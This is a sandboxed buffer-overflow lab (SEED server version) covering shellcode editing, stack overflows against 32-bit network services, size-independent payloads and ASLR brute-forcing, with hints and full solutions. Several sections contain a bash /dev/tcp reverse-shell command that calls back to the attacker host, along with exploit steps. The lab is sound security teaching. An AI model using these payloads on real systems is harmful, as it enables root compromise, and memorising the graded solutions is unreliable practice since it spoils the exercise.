title: Buffer Overflow Attack Lab (Server Version)
description: Hands-on buffer-overflow attack lab (SEED): exploit vulnerable network servers to obtain a root shell.
outcomes: Understand how a stack buffer overflow overwrites the return address.
Build a payload (NOP sled + shellcode + return address) and exploit a remote service.
Obtain a root reverse shell on a vulnerable server.
Build a single size-independent payload when the buffer layout is unknown.
Defeat 32-bit ASLR by brute force and explain why the same attack is impractical on 64-bit.

levels.title: Introduction
levels.content:
# Please read carefully

* This lab is for **educational purposes only**. The techniques must only be used inside this training sandbox.
* Each level builds on the previous one. Do not skip ahead.
* Revealing a solution or taking hints reduces your score.

# Scenario

You are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing three network services that each wrap a program written in C. All of them contain a classic **stack buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root shell** and read the secret flag on each service, then defeat address randomization.

You work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.

There are **four graded tasks**, each with its own unique per-sandbox flag: a shellcode warm-up on your own box (Task 1), then Level 1 (Task 2), Level 2 (Task 3) and the ASLR target (Task 4).

# Topology

| Machine | IP | Role |
|---|---|---|
| attacker | `10.1.26.23` | your box (you log in here) |
| server | `10.1.26.9` | runs the vulnerable services |

| Target | Address | Difficulty |
|---|---|---|
| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address (ASLR off) |
| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address (ASLR off) |
| Level 3 | `10.1.26.9:9092` | 32-bit, same binary as Level 1 but **ASLR on** |

levels.title: Get Access
levels.cloud_content:
Connect to the **attacker** machine, then submit the answer **`start`**.

### Sandbox access
1. In the topology overview on the right, right-click on **`attacker`** and click **`Open GUI`**; a new window appears.
2. Log in with username **`user`** and password **`Password123`**.

Alternatively you can use SSH. See the [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for details.
levels.local_content: This sandbox has not been tested for use with a local sandbox.

levels.title: Task 1 - Make the shellcode run your command
levels.content:
Shellcode is a small piece of machine code that launches a shell - and you can make it run **any command you want**. This warm-up proves you control what the injected code executes before you weaponise it in Task 2. Everything happens on your own attacker box - no server contact yet.

Work only with the 32-bit generator `shellcode_32.py` in `~/shellcode`:

```
user@attacker:~$ cd ~/shellcode
user@attacker:~/shellcode$ ./shellcode_32.py && make && ./a32.out
```

### What to change
Open `shellcode_32.py` and find the command-string line - the one that ends with a `*` marker. Change the command it runs to simply:

```
id
```

Keep the `*` in the **same column** by padding with spaces: the shellcode turns that `*` into a string terminator, so its position must not move. Leave the hex machine-code bytes and the four `AAAA`/`BBBB`/`CCCC`/`DDDD` slots exactly as they are. Then regenerate and run again:

```
user@attacker:~/shellcode$ ./shellcode_32.py && make && ./a32.out
uid=1000(user) gid=1000(user) groups=1000(user),1001(flag-t1-xxxxxxxxxxxx)
```

**Flag:** the `id` output lists your groups, and one has an unusual, sandbox-unique name starting with `flag-t1-`. Submit that **group name**.

> That group shows up only when `id` runs **through the shellcode** - `a32.out` is installed across a privilege boundary your own shell lacks. Typing `id` directly in your shell will not reveal it, so the step cannot be skipped.
levels.solution: In `shellcode_32.py`, change only the command-string line (the one ending with the `*` marker) so the command is `id`, padding with spaces so the `*` stays in the same column. Then `./shellcode_32.py && make && ./a32.out`. The shellcode runs `/bin/bash -c id` across the setuid boundary, so `id` prints a supplementary group named `flag-t1-...` - that group name is the flag.

hints.title: Where to edit
hints.content: Change only the command-string line in `shellcode_32.py` - the one ending with the `*` marker - to `id`. Keep the `*` in the same column by adding/removing spaces; do not touch the hex bytes or the AAAA/BBBB/CCCC/DDDD slots.

hints.title: Run it and read the output
hints.content: Regenerate and run: `./shellcode_32.py && make && ./a32.out`. Look at the `groups=...` part of the `id` output; the unusual entry that starts with `flag-t1-` is the flag.

levels.title: Task 2 - Level 1 attack (32-bit)
levels.content:
The first target runs on **`10.1.26.9:9090`**. It is a **32-bit** program. Send it a benign message first:

```
user@attacker:~$ echo hello | nc 10.1.26.9 9090
```

The server replies with the two values you need: the **frame pointer (ebp)** and the **buffer's address** inside `bof()`. From these you can compute where to place your return address and shellcode.

### Build the exploit
Edit `~/attack-code/exploit.py` (paste the 32-bit shellcode from Task 1, set `start`, `ret` and `offset`), then:

```
user@attacker:~/attack-code$ ./exploit.py           # creates badfile
user@attacker:~/attack-code$ cat badfile | nc 10.1.26.9 9090
```

### Get a root shell
Modify the shellcode's command string to launch a **reverse shell** back to your attacker box, and listen for it:

```
user@attacker:~$ nc -lnv 4444                       # terminal 1: listener
# reverse-shell command (runs on the target):
#   /bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1
user@attacker:~/attack-code$ cat badfile | nc 10.1.26.9 9090   # terminal 2: fire
```

When the reverse shell connects, you are **root inside the target**. Read the flag:

```
root@...:/# cat /root/flag
```

**Flag:** the contents of `/root/flag` on the Level 1 target.
levels.solution: Use the leaked ebp and buffer address: the return address slot is at `ebp+4`, so `offset = (ebp - buffer) + 4`. Set `ret` to an address inside the NOP sled (e.g. `buffer + 0x120`). Put the shellcode near the end of the 517-byte payload. Use the reverse-shell command string `/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`. After the shell connects, `cat /root/flag`.

hints.title: Finding the offset to the return address
hints.content: The saved return address sits just above the saved frame pointer: its offset in the buffer is `(ebp - buffer_address) + 4` bytes.

hints.title: Choosing the return address
hints.content: Point `ret` somewhere into the NOP sled, e.g. `buffer_address + 0x120`. Execution slides down the NOPs into your shellcode.

hints.title: Getting an interactive root shell
hints.content: Put a reverse shell in the shellcode command string: `/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`, and run `nc -lnv 4444` on the attacker first.

levels.title: Task 3 - Level 2 attack (32-bit, buffer size unknown)
levels.content:
The second target runs on **`10.1.26.9:9091`**. It is still a **32-bit** program, but this time it reveals **only the buffer's address** - not the frame pointer. That means you do **not** know the buffer size.

```
user@attacker:~$ echo hello | nc 10.1.26.9 9091
```

You are told only the range:

> Buffer size is somewhere in **[100, 300]** bytes. (The saved frame pointer is always a multiple of 4.)

Construct **a single payload** that works for any buffer size in that range - do not brute-force one size at a time. The trick: **spray the return address many times** across the region where the return slot could be, and place the shellcode at the very end of the 517-byte payload.

Get a root reverse shell exactly as in Task 2 (back to `10.1.26.23`), then:

```
root@...:/# cat /root/flag
```

**Flag:** the contents of `/root/flag` on the Level 2 target.
levels.solution: Because the buffer address is known but its size is not, fill the payload from `buffer_address` upward with copies of the return address (every 4 bytes), covering the whole [100,300] window where the saved return address may be - all return-address candidates point into the NOP sled. Place the shellcode at the end of the 517-byte buffer. One payload then works for any size in range. Reverse shell back to `10.1.26.23`, then `cat /root/flag`.

hints.title: One payload for the whole range
hints.content: Write the return address repeatedly, once every 4 bytes, across the window where the return slot could be (roughly offsets 100 to 304). Every copy points into the same NOP sled.

hints.title: Where to put the shellcode
hints.content: Put the shellcode at the very end of the 517-byte payload, so it is above every possible frame and never overwritten by the address spray.

levels.title: Task 4 - Defeat address randomization (ASLR)
levels.content:
The last target runs on **`10.1.26.9:9092`**. It is the **same 32-bit binary as Level 1**, but this container has **ASLR (Address Space Layout Randomization) enabled** (Levels 1 and 2 had it off). Connect a couple of times and watch the leaked buffer address:

```
user@attacker:~$ echo hello | nc 10.1.26.9 9092
Buffer's address inside bof():     0xff8a24c0
user@attacker:~$ echo hello | nc 10.1.26.9 9092
Buffer's address inside bof():     0xffd1e4c0
```

It is **different every time**, so your fixed return address from Task 2 usually misses. But on 32-bit the stack has only **19 bits** of entropy (2^19 = 524,288 possibilities) - small enough to defeat by **brute force**: fire the same payload until one run lines up.

### Brute force it
Keep the **exact `badfile` from Task 2** - do not recompute it. Start your listener, then loop the payload:

```
user@attacker:~$ nc -lnv 4444                       # terminal 1: listener
user@attacker:~/attack-code$ ./brute-force.sh       # terminal 2: loops badfile at :9092
```

Within a few minutes a run aligns, the root reverse shell connects back, and you can read the flag:

```
root@...:/# cat /root/flag
```

**Flag:** the contents of `/root/flag` on the Level 3 target.
levels.solution: The Level 3 binary is identical to Level 1 but runs with ASLR on, so the stack address randomizes on every connection and the fixed Task-2 return address usually points outside the NOP sled. Do not recompute the payload: keep the same `badfile` and fire it repeatedly with `~/attack-code/brute-force.sh` at `10.1.26.9:9092` while `nc -lnv 4444` listens. 32-bit ASLR has only 19 bits of entropy (2^19 = 524,288), small enough to exhaust; within minutes a run lines the return address up with the NOP sled, the root reverse shell connects, and `cat /root/flag` reveals the Level 3 flag.

hints.title: Why your old payload misses
hints.content: ASLR is on for Level 3, so the leaked buffer address changes on every connection. Your fixed Task-2 return address now usually points outside the NOP sled, so most runs crash instead of executing your shellcode.

hints.title: Brute-forcing it
hints.content: Reuse the exact `badfile` from Task 2 - do not recompute it. Start `nc -lnv 4444`, then run `~/attack-code/brute-force.sh`, which fires the payload in a loop at :9092. With only 2^19 stack bases, within minutes one run lines up, the root reverse shell connects, and you can `cat /root/flag`.
